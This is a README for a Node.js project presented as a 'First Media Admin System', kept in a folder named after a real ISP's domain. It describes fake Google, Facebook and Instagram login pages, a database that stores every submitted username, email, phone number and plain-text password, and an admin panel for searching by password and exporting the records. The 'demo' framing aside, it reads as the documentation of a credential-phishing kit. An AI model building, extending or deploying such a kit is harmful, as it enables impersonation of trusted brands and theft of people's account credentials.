# First Media Admin System with SQLite Database

A comprehensive authentication and admin system for First Media with SQLite database storage.

## 🚀 Features

- **SQLite Database**: Persistent data storage with automatic table creation
- **Real-time Data Collection**: All user inputs are stored in the database
- **Admin Panel**: Beautiful interface with statistics and data management
- **Search & Filter**: Advanced search and filtering capabilities
- **Export Functionality**: Export data to CSV or JSON format
- **Social Login**: Google, Facebook, and Instagram login pages
- **Responsive Design**: Works on desktop and mobile devices

## 📋 Prerequisites

- Node.js (v14 or higher)
- npm (comes with Node.js)

## 🛠️ Installation

1. **Clone or download the project**
2. **Run the setup script:**
   ```bash
   ./setup.sh
   ```

3. **Start the system:**
   ```bash
   ./start-unified.sh
   ```

## 🌐 Access URLs

After starting the server, you can access:

- **🔐 Login Page (Main)**: http://localhost:3000/auth.html
- **📊 Admin Panel**: http://localhost:3000/admin
- **🏠 Old Home Page**: http://localhost:3000/Login.html
- **📱 Dashboard**: http://localhost:3000/dashboard.html

## 📊 Database Structure

The SQLite database (`data/user_data.db`) contains a `users` table with the following columns:

| Column | Type | Description |
|--------|------|-------------|
| `id` | INTEGER | Primary key (auto-increment) |
| `username` | TEXT | User's username |
| `email` | TEXT | User's email address |
| `name` | TEXT | User's full name |
| `phone` | TEXT | User's phone number |
| `password` | TEXT | User's password (stored as plain text for demo) |
| `provider` | TEXT | Login provider (Google, Facebook, Instagram, etc.) |
| `user_agent` | TEXT | Browser user agent string |
| `action_type` | TEXT | Action performed (login, register, forgot_password, etc.) |
| `timestamp` | DATETIME | When the action occurred |

## 🔧 API Endpoints

### POST `/admin`
Receives user data and stores it in the database.

**Request Body:**
```json
{
  "username": "user123",
  "email": "user@example.com",
  "password": "password123",
  "action": "login",
  "provider": "regular"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Data saved to database",
  "id": 1
}
```

### GET `/api/data`
Retrieves all user data from the database.

### GET `/api/search?q=searchterm`
Searches user data by username, email, name, password, or provider.

### GET `/api/filter/:action`
Filters data by action type (login, register, google_login, etc.).

### GET `/api/stats`
Returns database statistics.

### DELETE `/api/clear`
Clears all data from the database.

## 📁 Project Structure

```
cek.firstmedia.com/
├── assets/                 # Static assets (CSS, JS, images)
├── chatbot/               # Chatbot functionality
├── data/                  # Database and data files
│   └── user_data.db      # SQLite database
├── auth.html              # Main login/register page
├── dashboard.html         # Dashboard page
├── google-login.html      # Google login page
├── facebook-login.html    # Facebook login page
├── instagram-login.html   # Instagram login page
├── database.js            # Database operations
├── unified-server.js      # Main server file
├── package.json           # Node.js dependencies
├── start-unified.sh      # Startup script
└── setup.sh              # Setup script
```

## 🔐 Security Notes

⚠️ **Important**: This is a demo system. In production:

- Passwords should be hashed (using bcrypt, argon2, etc.)
- Use HTTPS for all communications
- Implement proper session management
- Add rate limiting
- Use environment variables for sensitive data
- Implement proper input validation and sanitization

## 📊 Admin Panel Features

### Statistics Dashboard
- Total records count
- Unique users count
- Number of providers
- Number of action types

### Data Management
- Real-time data display
- Search functionality
- Filter by action type
- Export to CSV/JSON
- Clear all data

### Provider Badges
- Color-coded badges for different providers
- Google (blue), Facebook (blue), Instagram (gradient)
- Regular login (gray)

## 🚀 Development

### Running in Development Mode
```bash
npm run dev
```

### Running in Production Mode
```bash
npm start
```

### Database Operations

The `database.js` file provides the following functions:

- `initDatabase()`: Initialize the database and create tables
- `insertUserData(data)`: Insert user data into the database
- `getAllUserData()`: Retrieve all user data
- `searchUserData(searchTerm)`: Search user data
- `filterUserDataByAction(actionType)`: Filter by action type
- `getDatabaseStats()`: Get database statistics
- `clearAllData()`: Clear all data

## 🔄 Auto-refresh

The admin panel automatically refreshes data every 30 seconds to show the latest information.

## 📱 Mobile Responsive

All pages are designed to work on both desktop and mobile devices with responsive layouts.

## 🎨 Customization

You can customize the appearance by modifying:
- CSS files in `assets/css/`
- HTML templates in the server files
- Color schemes and styling

## 🐛 Troubleshooting

### Common Issues

1. **Port 3000 already in use**
   - The startup script will automatically kill existing processes
   - If issues persist, manually kill the process: `kill -9 $(lsof -t -i:3000)`

2. **Database errors**
   - Check if the `data/` directory exists
   - Ensure write permissions for the directory
   - Restart the server to reinitialize the database

3. **Dependencies not installed**
   - Run `npm install` manually
   - Check Node.js and npm versions

### Logs

The server provides detailed console logs for:
- Database operations
- API requests
- Error messages
- Server startup information

## 📄 License

This project is for demonstration purposes only.

## 🤝 Support

For issues or questions, check the console logs and ensure all prerequisites are met.
